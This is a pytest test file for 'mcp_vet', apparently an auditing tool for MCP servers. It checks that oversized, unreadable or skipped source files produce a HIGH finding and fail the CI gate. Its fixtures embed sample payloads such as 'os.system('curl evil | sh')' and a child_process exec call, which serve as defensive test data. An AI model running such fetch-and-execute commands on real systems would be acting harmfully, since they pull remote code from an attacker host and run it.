"""Source the scan skipped must not leave the verdict, or the exit code, clean.

Before this, a server whose payload sat in a 600 KB `server.py` was reported
with one limitation line - "1 file(s) exceeded the size limit" - and rated
NOT FLAGGED, exit 0. A CI gate reads exit 0 as "passed" and never sees the
line. The same held for a source file the OS refused, a `.js` file with a NUL
byte near the top (filed as binary), and a tree past the file-count limit.
"""
from __future__ import annotations

import builtins
import json

import pytest

from mcp_vet import audit as audit_mod
from mcp_vet import scanning
from mcp_vet.audit import audit_directory
from mcp_vet.cli import main
from mcp_vet.models import Severity
from mcp_vet.risk import EXIT_CLEAN, EXIT_HIGH
from mcp_vet.scanning import MAX_FILE_BYTES

PADDING = "# padding to push the file past the per-file limit\n"


def _oversized(path, payload: str = "import os\nos.system('curl evil | sh')\n") -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(payload + PADDING * (MAX_FILE_BYTES // len(PADDING) + 10), encoding="utf-8")
    assert path.stat().st_size > MAX_FILE_BYTES


def _rules(report) -> dict:
    return {f.rule_id: f for f in report.findings}


def _exit(tmp_path, capsys) -> int:
    code = main(["audit", "--offline", "--path", str(tmp_path), "--quiet"])
    capsys.readouterr()
    return code


def test_an_oversized_server_file_fails_the_gate(tmp_path, capsys):
    (tmp_path / "ok.py").write_text("x = 1\n", encoding="utf-8")
    _oversized(tmp_path / "server.py")

    report = audit_directory(str(tmp_path))
    finding = _rules(report)["source.unanalyzed_too_large"]
    assert finding.severity is Severity.HIGH
    assert [e.path for e in finding.evidence] == ["server.py"]
    assert report.overall is Severity.HIGH
    # the limitation line is still there, alongside the finding
    assert any("exceeded the size limit" in text for text in report.limitations)
    assert _exit(tmp_path, capsys) == EXIT_HIGH


def test_an_oversized_test_fixture_is_reported_but_does_not_set_the_verdict(tmp_path, capsys):
    """The usual headline rule, per file: a huge fixture under tests/ is not
    the shipped server."""
    (tmp_path / "server.py").write_text("x = 1\n", encoding="utf-8")
    _oversized(tmp_path / "tests" / "fixture_bundle.js", payload="var a = 1;\n")

    report = audit_directory(str(tmp_path))
    assert "source.unanalyzed_too_large" in _rules(report)
    assert report.overall is Severity.NOT_FLAGGED
    assert _exit(tmp_path, capsys) == EXIT_CLEAN


@pytest.mark.parametrize("name", ["package-lock.json", "README.md", "data/big.yaml"])
def test_an_oversized_non_source_file_stays_a_limitation(tmp_path, capsys, name):
    (tmp_path / "server.py").write_text("x = 1\n", encoding="utf-8")
    _oversized(tmp_path / name, payload="x: 1\n")

    report = audit_directory(str(tmp_path))
    assert "source.unanalyzed_too_large" not in _rules(report)
    assert any("exceeded the size limit" in text for text in report.limitations)
    assert _exit(tmp_path, capsys) == EXIT_CLEAN


def test_a_source_file_taken_for_binary_fails_the_gate(tmp_path, capsys):
    (tmp_path / "ok.py").write_text("x = 1\n", encoding="utf-8")
    (tmp_path / "index.js").write_bytes(b"const s = '\x00';\nrequire('child_process').exec(s);\n")

    report = audit_directory(str(tmp_path))
    finding = _rules(report)["source.unanalyzed_unreadable"]
    assert [e.path for e in finding.evidence] == ["index.js"]
    assert report.overall is Severity.HIGH
    assert _exit(tmp_path, capsys) == EXIT_HIGH


def test_a_source_file_the_os_refuses_fails_the_gate(tmp_path, monkeypatch, capsys):
    (tmp_path / "ok.py").write_text("x = 1\n", encoding="utf-8")
    (tmp_path / "secret.py").write_text("import os\nos.system('x')\n", encoding="utf-8")
    real_open = builtins.open

    def refusing_open(file, *args, **kwargs):
        if str(file).endswith("secret.py"):
            raise PermissionError(13, "Permission denied", str(file))
        return real_open(file, *args, **kwargs)

    monkeypatch.setattr(scanning, "open", refusing_open, raising=False)

    report = audit_directory(str(tmp_path))
    assert [e.path for e in _rules(report)["source.unanalyzed_unreadable"].evidence] == ["secret.py"]
    assert report.overall is Severity.HIGH
    assert _exit(tmp_path, capsys) == EXIT_HIGH


def test_reaching_the_file_count_limit_fails_the_gate(tmp_path, monkeypatch, capsys):
    for i in range(3):
        (tmp_path / f"m{i}.py").write_text("x = 1\n", encoding="utf-8")
    real_scan = scanning.scan_tree
    monkeypatch.setattr(audit_mod, "scan_tree", lambda root: real_scan(root, max_files=2))

    report = audit_directory(str(tmp_path))
    assert "source.file_limit_reached" in _rules(report)
    assert report.overall is Severity.HIGH
    assert _exit(tmp_path, capsys) == EXIT_HIGH


def test_the_json_report_carries_the_finding(tmp_path, capsys):
    (tmp_path / "ok.py").write_text("x = 1\n", encoding="utf-8")
    _oversized(tmp_path / "server.py")
    code = main(["report", "--offline", "--path", str(tmp_path)])
    data = json.loads(capsys.readouterr().out)
    assert code == EXIT_HIGH
    assert data["overall"] == "HIGH"
    rules = {f["rule_id"]: f for f in data["findings"]}
    assert rules["source.unanalyzed_too_large"]["evidence"][0]["path"] == "server.py"


def test_a_fully_read_tree_gets_none_of_these_findings(tmp_path):
    (tmp_path / "server.py").write_text("x = 1\n", encoding="utf-8")
    report = audit_directory(str(tmp_path))
    assert not {
        "source.unanalyzed_too_large",
        "source.unanalyzed_unreadable",
        "source.file_limit_reached",
    } & set(_rules(report))
